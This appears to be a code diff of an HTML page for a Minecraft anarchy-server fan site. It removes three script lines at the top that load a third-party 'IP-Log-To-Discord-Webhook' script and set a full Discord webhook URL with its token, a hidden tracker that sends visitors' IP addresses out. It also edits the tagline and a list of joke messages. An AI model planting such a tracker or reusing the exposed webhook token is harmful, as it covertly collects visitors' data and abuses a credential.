@@ -1,9 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
- <body> <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
-<script src="https://cdn.jsdelivr.net/gh/luisoos/IP-Log-To-Discord-Webhook/index.js"></script>
-<script>var webHookUrl = "https://discord.com/api/webhooks/1378138137070403667/0qQ-JfzKdU3yeXoKxFhB9-Vo8SMgTFX6QQZjzEDYSkqDBpq1p3evlqYX4BMK4KJlg04I";</script>
   <title>True Anarchy</title>
   <style>
     body {
@@ -139,7 +136,7 @@
   />
 
   <h1 class="glow">True Anarchy</h1>
-  <p>The Best Texture Packs For Vanilla Players.</p>
+  <p>We offer tools to enhance your game.</p>
 
   <p id="dynamic-message" class="glow"></p>
 
@@ -178,7 +175,7 @@
       "give your base coords to fitmc, he will world download your base",
       "2b2tmcpe.org is the best minecraft server",
       "bylat furhunter",
-      "bye bye ciryleader!",
+      "bye bye cityleader!",
       "yan will be vice president forever.",
       "veneno is bae",
       "operation nether jam",
@@ -189,6 +186,10 @@
       "pls kit",
       "how use three horon cheet 4 sheep laptop with 3 gb ram?",
       "today paypal banned 7 of my accounts for selling canda",
+      "cosmos ez",
+     "Remove 2b2tpe please it's a waste of hardware and the hardware can be used for the people who play 2b2tbe please remove 2b2tpe.",
+     "Bro gift 50$ @everyone @here",
+     
     ];
     const randomMessage = messages[Math.floor(Math.random() * messages.length)];
     document.getElementById('dynamic-message').textContent = randomMessage;
@@ -196,10 +197,7 @@
     const audio = document.getElementById('bg-audio');
     const muteBtn = document.getElementById('mute-btn');
 
-    // Try to autoplay unmuted audio
     audio.play().catch(() => {
-      // Autoplay failed (browser blocked)
-      // Mute audio and update button text
       audio.muted = true;
       muteBtn.textContent = 'Unmute Sound';
     });
